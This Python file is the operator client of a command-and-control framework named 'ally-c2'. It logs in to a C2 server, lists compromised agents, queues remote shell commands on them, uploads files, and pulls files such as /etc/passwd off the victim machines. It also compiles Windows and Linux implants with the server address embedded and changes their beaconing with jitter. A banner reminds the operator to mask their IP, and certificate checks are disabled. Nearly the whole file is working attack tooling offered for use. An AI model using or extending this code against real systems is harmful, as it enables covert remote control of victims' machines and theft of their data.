import readline #for semi shell interaction in input 
from pathlib import Path
from datetime import datetime, timezone
import asyncio
import json
import websockets
import os
import subprocess
import base64
import ssl
import random
import getpass
import hashlib


from prompt_toolkit import PromptSession, print_formatted_text
from prompt_toolkit.formatted_text import ANSI
from prompt_toolkit.patch_stdout import patch_stdout
from prompt_toolkit.shortcuts import clear


#-----
#### colors for printing #####
RESET = "\033[0m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BOLD = "\033[1m"
PURPLE = "\033[38;2;128;0;255m"
BLUE = "\033[34m"

DOWNLOAD_DESTINATIONS = {}



def banner():
    print(f"""{PURPLE}

                                                                                                      
         .8.          8 8888         8 8888  `8.`8888.      ,8'              ,o888888o.    8888 8888
        .888.         8 8888         8 8888   `8.`8888.    ,8'              8888     `88.   88   88 
       :88888.        8 8888         8 8888    `8.`8888.  ,8'            ,8 8888       `8.  88   88
      . `88888.       8 8888         8 8888     `8.`8888.,8'             88 8888            88   88
     .8. `88888.      8 8888         8 8888      `8.`88888'              88 8888            88   88
    .8`8. `88888.     8 8888         8 8888       `8. 8888               88 8888            88   88
   .8' `8. `88888.    8 8888         8 8888        `8 8888               88 8888            88   88
  .8'   `8. `88888.   8 8888         8 8888         8 8888               `8 8888       .8'  88   88
 .888888888. `88888.  8 8888         8 8888         8 8888                  8888     ,88'   88   88
.8'       `8. `88888. 8 888888888888 8 888888888888 8 8888                   `8888888P'    8888 8888


    {RESET}""")

def warning():
    banner()
    print(f"{BOLD}{RED}[!] warning [!]{RESET}\n")
    print("REMEMBER to take precaution and mask your ip\n")

    while True:
        con = input("do you want to continue[y/n] ").lower()
        if con == "y" or con == "n":
            break

    if con == "y":
        return True

    return False


    

def all_actions(actions):
    if actions == "main":
        print(f"""

### SERVER USE ###

- help
- clear
- build
    use: <windows|linux> <ip|domain> <port> <http|https>
    es. build linux 192.168.1.10 8080 https

- list-agents, lsa 
- use <agent id>


          """)

    if actions == "use":
        print(f"""
### AGENT USE ###

- back
    back to server mode
- help
- clear

- sh <shell cmd>
- ch-beacon <seconds> [jitter%]
    change agent polling interval by second
    es. ch-beacon 3600 50 , make polling of 1h + jitter

- upload <mypath> <agentpath>
- download  <agentpath> <mypath>
    

          """)


def my_clear():
    clear()

def command_not_found():
    print_formatted_text(ANSI(f"-- [{RED}-{RESET}] command not found"))

async def operator_login(username, pass_hash, websocket):

    auth_payload = {
        "action": "auth",
        "username": username,
        "password": pass_hash
    }
    await websocket.send(json.dumps(auth_payload))
    auth_resp = json.loads(await websocket.recv())
    
    if auth_resp.get("status") != "success":
        print_formatted_text(ANSI(f"\n{RED}[-] Auth failed: {auth_resp.get('message')}{RESET}\n"))
        return False
        
    print_formatted_text(ANSI(f"\n{GREEN}[+] Login success{RESET}\n"))

    print(f"\n\n{BOLD}welcome{RESET} to the ally-cII panel use {BOLD}help{RESET} to view")
    print(f"all the possible actions\n")
    return True

#-----


def compile_agent(source_file, target_os, output_name, built_server_url):

    if not os.path.exists(source_file):
        print_formatted_text(ANSI(f"[{RED}-{RESET}] src file {source_file} not found"))
        return

    print_formatted_text(ANSI(f"\n{BLUE}[*] Compiling  os: {target_os} -  srv: {built_server_url}...{RESET}"))

    try:
        env = os.environ.copy()
        env["GOOS"] = target_os
        env["GOARCH"] = "amd64"

        ldflags = f"-s -w -X 'main.ServerURL={built_server_url}'"

        build_cmd = [
                "go", "build",
                "-ldflags", ldflags,
                "-o", output_name,
                source_file
                ]

        result = subprocess.run(build_cmd, env=env, capture_output=True, text=True)

        if result.returncode == 0:
            print_formatted_text(ANSI(f"\n{GREEN}[+] agent successfully compiled: {output_name}{RESET}\n"))
        else:
            print_formatted_text(ANSI(f"\n{RED}[-] Error while compiling:\n{result.stderr}{RESET}\n"))

    except Exception as e:
        print_formatted_text(ANSI(f"\n{RED}[-] exception : {e}{RESET}\n"))
    return

def agent_name_gen(target_os):
    
    chars =["a","b","c", "d", "e", "f", "1", "2", "3", "4", "5"]
    name = ""
    first = ""
    last = ""

    if target_os == "windows":
        first = "win"
        last = ".exe"
    else:
        first = "lin"
        last = ".elf"
    

    for i in range(1 , 10):
        c = random.choice(chars)
        name = name + c

    return f"{first}_{name}{last}"






async def event_listener(event_url):
    try:
        # print(f"\n[DEBUG] connect to channel events: {event_url}")

        # use websockets.connect(event_url,ssl=ssl_context)
        async with websockets.connect(event_url,ssl=ssl_context) as ws:
        # async with websockets.connect(event_url) as ws:

            # print(f"[DEBUG] ")
            while True:
                response_raw = await ws.recv()
                # print(f"[DEBUG] : {response_raw}")
                
                response = json.loads(response_raw)
                if response.get("type") == "agent_output":
                    output_content = response.get('output', '')
                    agent_id = response.get('agent_id')
                    
                    if output_content.startswith("[DOWNLOAD_SUCCESS]|"):
                        try:
                            _, b64_data = output_content.split("|", 1)
                            file_bytes = base64.b64decode(b64_data)
                            
                            save_path = DOWNLOAD_DESTINATIONS.pop(agent_id, f"downloaded_{agent_id}_{int(asyncio.get_event_loop().time())}")
                            
                            with open(save_path, "wb") as f:
                                f.write(file_bytes)
                                
                            msg = f"\n{GREEN}[+] File downloaded successfully saved as: {save_path}{RESET}\n"
                        except Exception as e:
                            msg = f"\n{RED}[-] Error while saving file: {e}{RESET}\n"
                    else:
                        msg = f"\n{GREEN}[*] agent output [{agent_id}]:{RESET}\n{output_content}\n"
                        
                    print_formatted_text(ANSI(msg))
                    
    except websockets.exceptions.ConnectionClosed as e:
        print(f"\n{RED}[-] WebSocket closed form server: {e}{RESET}")
    except Exception as e:
        print(f"\n{RED}[-] critical error in event_listener: {e}{RESET}")







async def use_agent(websocket, agent_id, session):

    with patch_stdout():
        while True:
            shell_cmd = await session.prompt_async(ANSI(f"{BOLD}{PURPLE}agent{RESET}{BOLD}[{agent_id}]{RESET}[ally-c2] > "))
            shell_cmd= shell_cmd.strip()

            if not shell_cmd:
                continue

            parts = shell_cmd.split()
            action = parts[0]
            
            if action == "back":
                print_formatted_text(ANSI(f"\n{BLUE}[*]{RESET} exit use mode\n"))
                return
            elif action == "help":
                all_actions("use")
                continue
            elif action == "clear":
                my_clear()
                continue

            elif action == "sh":
                if len(parts) < 2:
                    print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: specify command (es. sh ls)"))
                    continue
                
                sh_cmd = " ".join(parts[1:])
                
                payload = {
                    "action": "queue_task",
                    "agent_id": agent_id,
                    "data": sh_cmd
                }
                await websocket.send(json.dumps(payload))
                _ = await websocket.recv()
                
                print_formatted_text(ANSI(f"\n{BLUE}[*] Task queued. wait for output...{RESET}\n"))
                continue

            elif action == "ch-beacon":
                if len(parts) < 2:
                    print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: specify second and jitter (es. ch-beacon 60 10)"))
                    continue
                
                interval = parts[1]
                jitter = parts[2] if len(parts) > 2 else "0"
                
                payload = {
                    "action": "update_beacon",
                    "agent_id": agent_id,
                    "interval": int(interval),
                    "jitter": int(jitter)
                }
                await websocket.send(json.dumps(payload))
                _ = await websocket.recv()
                
                print_formatted_text(ANSI(f"\n{GREEN}[+] Beacon updated: {interval}s (Jitter: {jitter}%){RESET}\n"))
                continue
            

            elif action == "upload":
                if len(parts) < 3:
                    print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: specify local file path and remote file path\n (es. upload /tmp/file.txt /var/tmp/file.txt)"))
                    continue
                
                local_path = parts[1]
                remote_path = parts[2]

                if not os.path.exists(local_path):
                    print_formatted_text(ANSI(f"[{RED}-{RESET}] local file not found: {local_path}"))
                    continue

                try:
                    with open(local_path, "rb") as f:
                        encoded_data = base64.b64encode(f.read()).decode('utf-8')
                    
                    task_data = f"upload {remote_path} {encoded_data}"
                    
                    payload = {
                        "action": "queue_task",
                        "agent_id": agent_id,
                        "data": task_data
                    }
                    await websocket.send(json.dumps(payload))
                    _ = await websocket.recv()
                    print_formatted_text(ANSI(f"\n{GREEN}[+] Task upload accorded for {local_path} -> {remote_path}{RESET}\n"))
                except Exception as e:
                    print_formatted_text(ANSI(f"[{RED}-{RESET}] Error reading local file: {e}"))
                continue



            elif action == "download":
                if len(parts) < 3:
                    print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: specify remote file path and local file path\n  (es. download /etc/passwd ./passwd.txt)"))
                    continue
                
                remote_path = parts[1]
                local_path = parts[2] 

                DOWNLOAD_DESTINATIONS[agent_id] = local_path

                task_data = f"download {remote_path}"
                
                payload = {
                    "action": "queue_task",
                    "agent_id": agent_id,
                    "data": task_data
                }
                await websocket.send(json.dumps(payload))
                _ = await websocket.recv()
                print_formatted_text(ANSI(f"\n{BLUE}[*] Task download accorded for {remote_path} -> {local_path}{RESET}\n"))
                continue


            else:
                command_not_found()




async def main(server_url, event_url):
    if not warning():
        return


    print(f"\n{BOLD}[+] Authentication Required{RESET}")
    username = input("Username: ").strip()
    password = getpass.getpass("Password: ")

    #getting pasasword hash
    pass_hash = hashlib.sha256(password.encode()).hexdigest()

    session = PromptSession()


    try: 

        #use websockets.connect(server_url,ssl=ssl_context) for tls 
        ### UNCOMMENT THIS FOR https
        async with websockets.connect(server_url,ssl=ssl_context) as websocket:
        # async with websockets.connect(server_url) as websocket:
        
            if not await operator_login(username, pass_hash, websocket):
                return

            
            asyncio.create_task(event_listener(event_url)) 

            with patch_stdout():
                while True:
                    cmd = await session.prompt_async(ANSI(f"{BOLD}{RED}server{RESET}[ally-c2] > "))
                    cmd = cmd.strip().lower()

                    if not cmd:
                        continue
                    parts = cmd.lower().split()
                    action = parts[0]


                    if action == "help":
                        all_actions("main")
                        continue
                    elif action == "exit":
                        print("press ctrl + C to exit")
                    elif action == "clear":
                        my_clear()
                        continue




                    elif action == "list-agents" or action == "lsa":
                        payload = {"action": "list_agents"}
                        await websocket.send(json.dumps(payload))
                        response = json.loads(await websocket.recv())
                        
                        agents = response.get('agents', [])
                        
                        print("\nActive Agents:")
                        print("-" * 65)
                        if not agents:
                            print("  (no agent )")
                        else:
                            for agent in agents:
                                agent_id = agent.get('id', 'N/A')
                                diff = agent.get('seconds_ago', 0)
                                
                                if diff < 0:
                                    diff = 0  
                                    
                                if diff < 60:
                                    time_ago = f"{diff} sec ago"
                                elif diff < 3600:
                                    time_ago = f"{diff // 60} min ago"
                                else:
                                    time_ago = f"{diff // 3600} h ago"
                                    
                                print(f"ID:        {agent_id:<15}        | latest poll: {time_ago}")
                                
                        print("-" * 65 + "\n")
                        continue


                    elif action == "use":
                        if len(parts) < 2:
                            print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: you have to specify the Agent id (es. use 123)"))
                            continue
                        
                        agent_id = parts[1]
                        print_formatted_text(ANSI(f"\n{BLUE}[*]{RESET} Entered agent session: {agent_id}\n"))
                        
                        await use_agent(websocket, agent_id, session) 
                        continue
                    
    


                    elif action == "build":

                        root_dir = Path(__file__).resolve().parent.parent

                        linux_agent_path = root_dir / "linux_agent" / "lin_agent.go"
                        windows_agent_path = root_dir / "windows_agent" / "win_agent.go"

                        if len(parts) < 5:
                            print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: invalid syntax."))
                            print_formatted_text(ANSI(f"Usage: build <windows|linux> <ip> <port> <http|https>"))
                            continue

                        target_os = parts[1].lower()
                        ip = parts[2]
                        port = parts[3]
                        scheme = parts[4].lower()

                        if target_os not in ["windows", "linux"]:
                            print_formatted_text(ANSI(f"[{RED}-{RESET}] OS unsupported. use 'windows' or 'linux'."))
                            continue

                        agent_http_scheme = "https" if scheme == "https" or scheme == "wss" else "http"
                        built_server_url = f"{agent_http_scheme}://{ip}:{port}"

                        if target_os == "windows":
                            output_name = agent_name_gen(target_os)
                            compile_agent(windows_agent_path, target_os, output_name,built_server_url) 
                        else:
                            output_name = agent_name_gen(target_os)
                            compile_agent(linux_agent_path, target_os, output_name,built_server_url)


                    
                    else:
                        command_not_found()










    except websockets.exceptions.ConnectionClosed:
        print("[-] Connection closed form server.")
    except Exception as e:
        print(f"[-] Error of connection: {e}")


if __name__ == "__main__":

    #ssl context

    #uncomment this if you want to use tls
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    #change this to wss if you are using tls
    server_url = "wss://192.168.1.172:8080/ws/operator"
    events_url= "wss://192.168.1.172:8080/ws/events"

    try:
        asyncio.run(main(server_url,events_url))
    except KeyboardInterrupt:
        print(f"\n[{RED}*{RESET}] forced exit from ally-c2 CLI-CLIENT.")




